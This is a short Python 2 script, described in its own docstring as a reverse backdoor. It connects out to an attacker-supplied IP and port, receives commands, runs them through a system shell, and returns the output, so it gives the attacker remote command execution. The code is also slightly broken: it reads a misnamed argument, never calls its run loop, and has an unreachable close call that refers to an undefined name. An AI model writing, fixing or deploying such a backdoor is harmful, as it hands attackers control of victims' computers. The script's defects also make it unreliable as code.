#! /usr/bin/python
"""A simple reverse backdoor script.
   Uses Python 2.7.16"""

import subprocess
import optparse
import socket
import json


def get_arguments():
    """Get user supplied arguments from terminal."""
    parser = optparse.OptionParser()
    # arguments
    parser.add_option('-a', '--attacker', dest='attacker', help='Attacking host IP.')
    parser.add_option('-p', '--port', dest='port', help='Port to connect to.')

    (options, arguments) = parser.parse_args()

    return options


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # IPv4 and TCP
        self.connection.connect((ip, port))                                 # establishes connection


    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)


    def reliable_receive(self):
        json_data = self.connection.recv(1024)
        return json.loads(json_data)


    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)


    def run(self):
        while True:
            command = self.reliable_receive()
            command_result = self.execute_system_command(command)
            self.reliable_send(command_result)

        connection.close()                      # closes connection


options = get_arguments()

my_backdoor = Backdoor(options.ip, options.port)
# connection.send('\n[+] Connection established.\n')              # verifies to attacker that connection is valid
